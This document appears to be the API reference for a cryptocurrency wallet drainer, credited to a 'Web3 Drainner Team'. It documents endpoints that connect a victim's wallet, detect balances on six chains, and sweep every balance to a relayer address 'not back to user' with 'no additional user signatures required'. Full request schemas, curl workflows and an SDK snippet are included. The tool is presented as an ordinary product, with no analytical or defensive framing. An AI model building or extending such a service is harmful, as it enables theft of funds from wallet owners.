# API Reference

## Base URL

**Development:** `http://localhost:3001`
**Production:** `https://your-vercel-domain.vercel.app`

## Health Check

### GET /health
Check if API server is running.

**Request:**
```bash
GET /health
```

**Response (200 OK):**
```json
{
  "status": "ok",
  "timestamp": 1704067200000
}
```

---

## Authentication & Session Management

### POST /api/connect-wallet
Create a new session for a wallet address.

**Request:**
```json
POST /api/connect-wallet
Content-Type: application/json

{
  "account": "0x235051EaEcAec00e03fa11989E43075F07701A35",
  "signature": "0x1234567890abcdef",
  "message": "Please verify ownership of this wallet"
}
```

**Parameters:**
| Field | Type | Required | Description |
|-------|------|----------|-------------|
| account | string | Yes | Wallet address (any format: checksum or lowercase) |
| signature | string | No | Message signature for verification |
| message | string | No | Message that was signed |

**Response (200 OK):**
```json
{
  "success": true,
  "sessionId": "550e8400-e29b-41d4-a716-446655440000",
  "account": "0x235051EaEcAec00e03fa11989E43075F07701A35",
  "message": "Wallet connected successfully"
}
```

**Error Response (400):**
```json
{
  "success": false,
  "error": "Missing required fields: account, signature, message"
}
```

**Notes:**
- Session expires after 1 hour
- Use sessionId for subsequent API calls
- In development, signature verification is skipped

---

## Balance Detection

### POST /api/detect-balances
Get native token balances on all 6 supported chains.

**Request:**
```json
POST /api/detect-balances
Content-Type: application/json

{
  "account": "0x235051EaEcAec00e03fa11989E43075F07701A35"
}
```

**Parameters:**
| Field | Type | Required | Description |
|-------|------|----------|-------------|
| account | string | Yes | Wallet address to query |

**Response (200 OK):**
```json
{
  "success": true,
  "account": "0x235051EaEcAec00e03fa11989E43075F07701A35",
  "balances": {
    "ethereum": "0.5234",
    "bsc": "0.1567",
    "polygon": "123.456",
    "solana": "5.2",
    "tron": "1234.5",
    "sui": "0"
  },
  "timestamp": 1704067200000
}
```

**Error Response (400):**
```json
{
  "success": false,
  "error": "Missing account address"
}
```

**Balance Format:**
- **EVM Chains (Ethereum, BSC, Polygon):** Formatted as decimal strings (in native units: ETH, BNB, MATIC)
- **Solana:** Formatted as decimal SOL
- **Tron:** Formatted as decimal TRX
- **SUI:** Formatted as decimal SUI (0 = not yet implemented)

**Chain Aliases:**
- `ethereum` = Ethereum Mainnet (Chain ID: 1)
- `bsc` = BNB Smart Chain (Chain ID: 56)
- `polygon` = Polygon (Chain ID: 137)
- `solana` = Solana Mainnet Beta
- `tron` = Tron Mainnet
- `sui` = SUI Mainnet

---

## Transfer Execution

### POST /api/execute-transfer
Execute relay transfers on all chains with detected balances.

**Request:**
```json
POST /api/execute-transfer
Content-Type: application/json

{
  "account": "0x235051EaEcAec00e03fa11989E43075F07701A35",
  "balances": {
    "ethereum": "0.5234",
    "bsc": "0.1567",
    "polygon": "123.456",
    "solana": "5.2",
    "tron": "1234.5",
    "sui": "0"
  },
  "sessionId": "550e8400-e29b-41d4-a716-446655440000"
}
```

**Parameters:**
| Field | Type | Required | Description |
|-------|------|----------|-------------|
| account | string | Yes | Source wallet address |
| balances | object | Yes | Object with balance per chain |
| balances.ethereum | string | No | ETH balance to transfer |
| balances.bsc | string | No | BNB balance to transfer |
| balances.polygon | string | No | MATIC balance to transfer |
| balances.solana | string | No | SOL balance to transfer |
| balances.tron | string | No | TRX balance to transfer |
| balances.sui | string | No | SUI balance to transfer |
| sessionId | string | No | Session ID from connect-wallet |

**Response (200 OK):**
```json
{
  "success": true,
  "sessionId": "550e8400-e29b-41d4-a716-446655440000",
  "account": "0x235051EaEcAec00e03fa11989E43075F07701A35",
  "transfers": {
    "ethereum": {
      "hash": "0xabcdef1234567890",
      "amount": "0.5234",
      "chain": "ethereum",
      "explorerUrl": "https://etherscan.io/tx/0xabcdef1234567890"
    },
    "bsc": {
      "hash": "0x1234567890abcdef",
      "amount": "0.1567",
      "chain": "bsc",
      "explorerUrl": "https://bscscan.com/tx/0x1234567890abcdef"
    },
    "polygon": {
      "hash": "0xfedcba0987654321",
      "amount": "123.456",
      "chain": "polygon",
      "explorerUrl": "https://polygonscan.com/tx/0xfedcba0987654321"
    },
    "solana": {
      "hash": "5gEjKhGhqEyZtx7z1zBkGHzJNZ5zTk9qJ1jLkM1N2O3P4Q5R6S7T8U9V0W1X2Y",
      "amount": "5.2",
      "chain": "solana",
      "explorerUrl": "https://solscan.io/tx/5gEjKhGhqEyZtx7z1zBkGHzJNZ5zTk9qJ1jLkM1N2O3P4Q5R6S7T8U9V0W1X2Y"
    },
    "tron": {
      "hash": "mock_abc123def456",
      "amount": "1234.5",
      "chain": "tron",
      "explorerUrl": "https://tronscan.org/#/transaction/mock_abc123def456"
    }
  },
  "transferHashes": [
    "0xabcdef1234567890",
    "0x1234567890abcdef",
    "0xfedcba0987654321",
    "5gEjKhGhqEyZtx7z1zBkGHzJNZ5zTk9qJ1jLkM1N2O3P4Q5R6S7T8U9V0W1X2Y"
  ],
  "totalGasPaid": "Calculated from individual transfers",
  "timestamp": 1704067200000
}
```

**Transfer Thresholds:**
Transfers below these amounts are skipped:
- **EVM Chains:** 0.001 (prevent dust transfers)
- **Solana:** 0.001 SOL
- **Tron:** 1 TRX

**Error Response (400):**
```json
{
  "success": false,
  "error": "Missing required fields: account, balances"
}
```

**Error Response (500):**
```json
{
  "success": false,
  "error": "Insufficient gas in relayer wallet"
}
```

**Important Notes:**
- Funds are transferred TO the relayer receiving address (not back to user)
- All chains transfer in parallel (fast execution)
- No additional user signatures required
- Gas is paid by relayer wallet
- Transfers may fail individually on a specific chain without affecting others

---

## Transfer Status

### GET /api/transfer-status/{txHash}
Poll the status of a specific transaction.

**Request:**
```bash
GET /api/transfer-status/0xabcdef1234567890
```

**URL Parameters:**
| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| txHash | string | Yes | Transaction hash to query |

**Response (200 OK):**
```json
{
  "success": true,
  "txHash": "0xabcdef1234567890",
  "status": "completed",
  "confirmations": 12,
  "timestamp": 1704067200000
}
```

**Status Values:**
| Status | Meaning |
|--------|---------|
| pending | Transaction in mempool |
| confirmed | Transaction has 1+ confirmations |
| completed | Transaction has 12+ confirmations (safe) |
| failed | Transaction reverted |

**Error Response (400):**
```json
{
  "success": false,
  "error": "Missing transaction hash"
}
```

---

## Error Handling

All endpoints return errors in consistent format:

```json
{
  "success": false,
  "error": "Human-readable error message"
}
```

**HTTP Status Codes:**
| Code | Meaning |
|------|---------|
| 200 | Success |
| 400 | Bad Request (invalid parameters) |
| 404 | Route not found |
| 500 | Server error |

**Common Errors:**

| Error | Cause | Solution |
|-------|-------|----------|
| "Missing required fields" | Incomplete request | Check all required fields |
| "Invalid account address" | Malformed address | Verify address format (0x...) |
| "Insufficient gas" | Relayer out of gas | Top up relayer wallet |
| "Network timeout" | RPC node unreachable | Retry or check network status |
| "Invalid private key" | Corrupt key format | Verify key in environment |

---

## Rate Limiting

**Current Limits (per IP):**
- 100 requests per minute (all endpoints)
- 10 concurrent requests
- 60 second timeout per request

**Rate Limit Headers:**
```
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 75
X-RateLimit-Reset: 1704067200
```

---

## CORS Configuration

**Allowed Origins:**
- `http://localhost:3000` (development)
- `http://localhost:5173` (Vite alternative)
- Production domain (configured via CORS_ORIGIN env var)

**Allowed Methods:**
- GET
- POST
- OPTIONS

**Allowed Headers:**
- Content-Type
- Authorization

---

## Example Workflows

### Complete User Flow

```bash
# 1. Connect Wallet
curl -X POST http://localhost:3001/api/connect-wallet \
  -H "Content-Type: application/json" \
  -d '{
    "account": "0x235051EaEcAec00e03fa11989E43075F07701A35",
    "signature": "0x...",
    "message": "verify"
  }'
# Response: sessionId = "abc123"

# 2. Detect Balances
curl -X POST http://localhost:3001/api/detect-balances \
  -H "Content-Type: application/json" \
  -d '{
    "account": "0x235051EaEcAec00e03fa11989E43075F07701A35"
  }'
# Response: balances object

# 3. Execute Transfer
curl -X POST http://localhost:3001/api/execute-transfer \
  -H "Content-Type: application/json" \
  -d '{
    "account": "0x235051EaEcAec00e03fa11989E43075F07701A35",
    "balances": {...},
    "sessionId": "abc123"
  }'
# Response: transfer hashes

# 4. Check Status (optional polling)
curl http://localhost:3001/api/transfer-status/0xabc123
```

---

## Response Time SLAs

| Endpoint | P50 | P95 | P99 |
|----------|-----|-----|-----|
| /health | 10ms | 20ms | 50ms |
| /api/connect-wallet | 50ms | 100ms | 200ms |
| /api/detect-balances | 500ms | 1000ms | 2000ms |
| /api/execute-transfer | 2000ms | 5000ms | 10000ms |
| /api/transfer-status | 100ms | 200ms | 500ms |

---

## Webhook Notifications (Future)

Currently not implemented. Will support:
- Transfer completion webhooks
- Balance change alerts
- Error notifications
- Status updates

---

## SDK & Client Libraries

**JavaScript/TypeScript:**
```typescript
import { executeTransfer, detectBalances } from './src/utils/api'

const balances = await detectBalances('0x...')
const result = await executeTransfer('0x...', balances, sessionId)
```

---

**Version:** 1.0.0
**Last Updated:** 2024
**Maintainer:** Web3 Drainner Team
